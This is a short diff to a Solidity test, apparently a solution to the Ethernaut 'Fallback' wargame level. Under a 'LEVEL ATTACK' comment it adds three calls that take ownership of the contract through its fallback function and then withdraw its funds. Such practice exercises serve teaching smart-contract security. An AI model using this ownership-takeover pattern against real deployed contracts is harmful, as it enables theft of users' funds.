@@ -32,6 +32,9 @@ contract FallbackTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
+        ethernautFallback.contribute{value: 1 wei}();
+        address(ethernautFallback).call{value: 1 wei}("blah");
+        ethernautFallback.withdraw();
 
         //////////////////////
         // LEVEL SUBMISSION //
